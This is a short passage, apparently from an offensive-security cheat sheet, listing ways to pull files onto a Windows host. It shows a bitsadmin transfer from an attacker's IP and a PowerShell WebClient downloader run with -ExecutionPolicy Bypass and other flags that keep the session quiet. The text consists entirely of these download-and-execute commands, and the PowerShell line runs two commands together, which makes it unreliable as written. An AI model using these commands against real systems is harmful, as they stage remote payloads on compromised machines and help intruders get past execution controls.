...
bitsadmin /transfer download /priority normal http://$ip/file C:\output\path (Works on Windows 7/Windows Server 2000+)
...
echo $webclient.DownloadFile($url,$filename) >> wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename
```
